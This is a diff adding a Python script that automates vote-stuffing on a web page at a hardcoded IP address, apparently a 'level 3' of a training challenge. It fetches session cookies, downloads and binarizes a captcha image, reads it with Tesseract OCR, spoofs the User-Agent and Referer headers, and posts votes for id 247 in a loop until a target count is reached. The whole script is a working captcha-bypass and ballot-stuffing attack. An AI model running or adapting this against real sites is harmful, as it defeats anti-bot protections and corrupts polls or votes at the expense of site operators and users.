@@ -1,0 +1,65 @@
+#!/usr/bin/python3
+
+import cv2 as cv
+import requests
+import pytesseract
+import tesserocr
+import numpy
+from PIL import Image
+from scipy.misc import imsave
+
+def binarize_array(numpy_array, threshold=200):
+    """Binarize a numpy array."""
+    for i in range(len(numpy_array)):
+        for j in range(len(numpy_array[0])):
+            if numpy_array[i][j] > threshold:
+                numpy_array[i][j] = 255
+            else:
+                numpy_array[i][j] = 0
+    return numpy_array
+
+
+url = 'http://158.69.76.135/level3.php'
+my_id = 247
+current_votes = 19
+while current_votes <= 1024:
+    r1 = requests.get(url)
+
+    HoldTheDoor = r1.cookies.values()[0]
+
+    cap = requests.get('http://158.69.76.135/captcha.php')
+    PHPSESSID = cap.cookies.values()[0]
+#    print('PHPSESSID: ', PHPSESSID)
+#    print('HoldTheDoor: ', HoldTheDoor)
+
+    with open('cap.png', 'wb') as f:
+        f.write(cap.content)
+    captcha = Image.open('cap.png')
+    graycap = captcha.convert('L')
+    graycap.save('cap_grey.png')
+    gray = Image.open('cap_grey.png')
+    gray = numpy.array(gray)
+    gray = binarize_array(gray, 128)
+    imsave('cap_thresh.png', gray)
+    final = Image.open('cap_thresh.png')
+    api = tesserocr.PyTessBaseAPI()
+    api.Init()
+    api.SetVariable("tessedit_char_whitelist", "0123456789abcdefghijklmnopqrstuvwxyz")
+    api.SetImage(final)
+    captcha = api.GetUTF8Text()[0:-2]
+    print('CAPTCHA: [{}]'.format(captcha), end=': ')
+    data = {
+            'id': my_id,
+            'holdthedoor': 'Submit',
+            'PHPSESSID': PHPSESSID,
+            'key': HoldTheDoor,
+            'captcha': str(captcha)
+    }
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; Win64; x64)', 'Referer': url}
+    cookies = {'HoldTheDoor': HoldTheDoor, 'PHPSESSID': PHPSESSID}
+    r2 = requests.post(url, data=data, cookies=cookies, headers=headers)
+    if '247' in str(r2.content):
+        print('boom')
+        current_votes += 1
+    else:
+        print('miss')
